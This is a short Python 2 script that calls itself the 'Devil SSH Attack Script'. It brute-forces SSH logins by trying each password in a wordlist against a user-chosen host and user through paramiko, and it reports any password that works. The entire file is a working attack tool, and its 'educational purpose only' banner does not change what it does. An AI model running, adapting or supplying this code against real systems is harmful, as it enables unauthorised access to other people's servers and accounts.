import socket
import sys
import os
try:
    import paramiko
except:
    #!exit if lib. paramiko not found in python.
    sys.exit(1);

print """

  Devil SSH Attack Script
  Written By : DorkerDevil [ India ]
  Email : dorkerdevil280@gmial.com
  
  [WARNING] Only for educational purpose dont use it for hacking purpose.

\n\n
"""

def _brute_():
    global host,user,wordlist;
    host = raw_input("[*] Target Server : ");
    user = raw_input("[*] Target User : ");
    wordlist = raw_input("[*] Wordlist : ");

    ssh = paramiko.SSHClient();
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy());
    f = open(wordlist,'r');
    data = f.readlines();
    len_data = len(data);
    print "[!] wordlist contain [ %s ] words."%len_data
    print "[!] connected to target ssh [ %s ]."%host
    print "[!] starting attack on user [ %s ]."%user
    print "\n\n";
    for pas in data:
        pas = pas.replace("\n","");
        len_data -= 1;
        try:
            ssh.connect(host,port=22,username=user, password=pas);
            print "\n";
            print "------------------------------------------------------------------"
            print "[ %s ] [success] user : %s | password : %s ."%(len_data,user,pas);
            print "------------------------------------------------------------------"
            sys.exit(1);
        except paramiko.AuthenticationException:
            print "[ %s ] [error] password %s is not correct."%(len_data,pas);




try:
    _brute_();
except KeyboardInterrupt:
    print "\n\n\t[ok] operation cancelled successfully [ ctrl + c ] pressed.\n\n";
    sys.exit(1);
except socket.error:
    print "\n\t[fail] unable to establish connection on target ssh [ %s ]."%host;
    sys.exit(1);
except IOError:
    print "\n\t[fail] unable to open or read wordlist. please recheck it again.\n\n";
    sys.exit(1);
except:
    pass
